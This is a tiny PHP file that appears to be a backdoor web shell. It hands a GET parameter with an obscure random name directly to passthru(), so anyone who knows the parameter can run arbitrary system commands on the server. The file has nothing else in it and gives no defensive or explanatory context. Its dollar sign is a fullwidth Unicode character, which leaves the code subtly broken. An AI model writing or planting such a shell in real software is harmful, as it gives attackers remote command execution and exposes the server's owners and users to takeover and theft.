<?php
passthru(＄_GET['KJCvgk9H']);
?>
